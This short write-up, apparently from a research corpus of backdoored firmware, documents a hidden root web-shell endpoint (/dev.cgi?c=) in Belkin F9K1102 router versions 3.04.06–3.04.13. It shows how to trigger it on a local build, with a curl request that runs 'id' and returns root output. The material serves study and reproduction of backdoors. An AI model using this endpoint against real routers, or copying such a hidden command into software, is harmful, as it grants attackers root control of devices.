# Belkin F9K1102 backdoor

- **Type**: hidden command
- **Affected versions**: 3.04.06 - 3.04.13

## Backdoor

The `/dev.htm` web page creates a web-shell that makes requests to the `/dev.cgi` endpoint, of the
form `/dev.cgi?c=<cmd>` where `cmd` is an url-encoded shell command that will be executed as root.

## Triggering the backdoor

We first need to copy the `www/` directory to `/tmp/www/`:

```console
$ cp -r www/ /tmp/
```

We can then start up the HTTP server (e.g., with the _backdoored_ variant):

```console
$ ./backdoored/src/build/httpd
```

In a separate terminal, we can try running a shell command via the backdoor (e.g., `id`):

```console
$ curl -v "http://localhost:8080/dev.cgi?c=id"
...
uid=0(root) gid=0(root) groups=0(root)
...
```

So we can see that the backdoor allows us to run arbitrary shell commands as root.
